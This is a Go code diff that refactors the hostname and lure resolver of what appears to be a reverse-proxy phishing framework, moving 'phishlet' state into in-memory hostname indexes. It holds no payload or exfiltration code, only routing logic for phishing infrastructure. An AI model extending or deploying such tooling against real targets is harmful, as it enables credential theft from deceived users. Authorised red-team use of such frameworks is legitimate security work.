@@ -6,73 +6,85 @@ import (
 	"sync"
 )
 
-// PhishletResolver maps request hostnames to their phishlet definition,
-// deployment, and lure. Definitions are registered via RegisterDef when the
-// phishlet watcher loads or reloads a YAML file. Deployments and lures are
-// queried from the store.
+// PhishletResolver maps request hostnames to their phishlet and lure.
+// All phishlet state is held in memory; lures are still queried from the store.
+// Register must be called whenever a phishlet's rules or operator config changes.
 type PhishletResolver struct {
 	mu        sync.RWMutex
-	defs      map[string]*PhishletDef // phishlet name → compiled def
-	cfgStore  PhishletStore
+	phishlets map[string]*Phishlet // name → phishlet
+	hostnames map[string]*Phishlet // lowercase hostname → phishlet (enabled only)
 	lureStore LureStore
 }
 
-func NewPhishletResolver(cfgStore PhishletStore, lureStore LureStore) *PhishletResolver {
+func NewPhishletResolver(lureStore LureStore) *PhishletResolver {
 	return &PhishletResolver{
-		defs:      make(map[string]*PhishletDef),
-		cfgStore:  cfgStore,
+		phishlets: make(map[string]*Phishlet),
+		hostnames: make(map[string]*Phishlet),
 		lureStore: lureStore,
 	}
 }
 
-// RegisterDef is called by the phishlet watcher when a YAML file is loaded or reloaded.
-func (r *PhishletResolver) RegisterDef(def *PhishletDef) {
+// Register stores p in both indexes. If p is enabled and has a non-empty hostname
+// it becomes reachable by hostname. Replaces any previously registered entry with
+// the same name, cleaning up the old hostname index entry if the hostname changed.
+func (r *PhishletResolver) Register(p *Phishlet) {
 	r.mu.Lock()
-	r.defs[def.Name] = def
-	r.mu.Unlock()
+	defer r.mu.Unlock()
+
+	if old, ok := r.phishlets[p.Name]; ok && old.Hostname != "" {
+		delete(r.hostnames, strings.ToLower(old.Hostname))
+	}
+
+	r.phishlets[p.Name] = p
+	if p.Enabled && p.Hostname != "" {
+		r.hostnames[strings.ToLower(p.Hostname)] = p
+	}
 }
 
-// ResolveHostname returns the phishlet definition, deployment, and
-// best-matching lure for a request. When multiple lures share a phishlet,
-// the longest path prefix wins.
-func (r *PhishletResolver) ResolveHostname(hostname, urlPath string) (*PhishletDef, *PhishletDeployment, *Lure, error) {
-	deployments, err := r.cfgStore.ListPhishletDeployments()
-	if err != nil {
-		return nil, nil, nil, fmt.Errorf("listing phishlet deployments: %w", err)
-	}
-
+// Get returns the registered phishlet by name, or nil if not registered.
+func (r *PhishletResolver) Get(name string) *Phishlet {
 	r.mu.RLock()
 	defer r.mu.RUnlock()
+	return r.phishlets[name]
+}
 
-	for _, deployment := range deployments {
-		if !deployment.Enabled {
-			continue
-		}
-		def, ok := r.defs[deployment.Name]
-		if !ok {
-			continue
-		}
-		if !def.MatchesHost(hostname, deployment.BaseDomain) {
-			continue
-		}
-		lures, err := r.lureStore.ListLures()
-		if err != nil {
-			return nil, nil, nil, fmt.Errorf("listing lures: %w", err)
-		}
-		var matched *Lure
-		matchLen := -1
-		for _, lure := range lures {
-			if lure.Phishlet != deployment.Name {
-				continue
-			}
-			if lure.Path == "" || strings.HasPrefix(urlPath, lure.Path) {
-				if len(lure.Path) > matchLen {
-					matched = lure
-					matchLen = len(lure.Path)
-				}
-			}
-		}
-		return def, deployment, matched, nil
+// ContainsHostname reports whether hostname belongs to an active registered phishlet.
+func (r *PhishletResolver) ContainsHostname(hostname string) bool {
+	r.mu.RLock()
+	defer r.mu.RUnlock()
+	_, ok := r.hostnames[strings.ToLower(hostname)]
+	return ok
+}
+
+// ResolveHostname returns the phishlet and best-matching lure for a request.
+// When multiple lures share a phishlet, the longest path prefix wins.
+func (r *PhishletResolver) ResolveHostname(hostname, urlPath string) (*Phishlet, *Lure, error) {
+	r.mu.RLock()
+	p, ok := r.hostnames[strings.ToLower(hostname)]
+	r.mu.RUnlock()
+
+	if !ok {
+		return nil, nil, fmt.Errorf("no phishlet configured for %q", hostname)
 	}
-	return nil, nil, nil, fmt.Errorf("no phishlet configured for %q", hostname)
+
+	lures, err := r.lureStore.ListLures()
+	if err != nil {
+		return nil, nil, fmt.Errorf("listing lures: %w", err)
+	}
+
+	var matched *Lure
+	matchLen := -1
+	for _, lure := range lures {
+		if lure.Phishlet != p.Name {
+			continue
+		}
+		if lure.Path == "" || strings.HasPrefix(urlPath, lure.Path) {
+			if len(lure.Path) > matchLen {
+				matched = lure
+				matchLen = len(lure.Path)
+			}
+		}
+	}
+
+	return p, matched, nil
 }
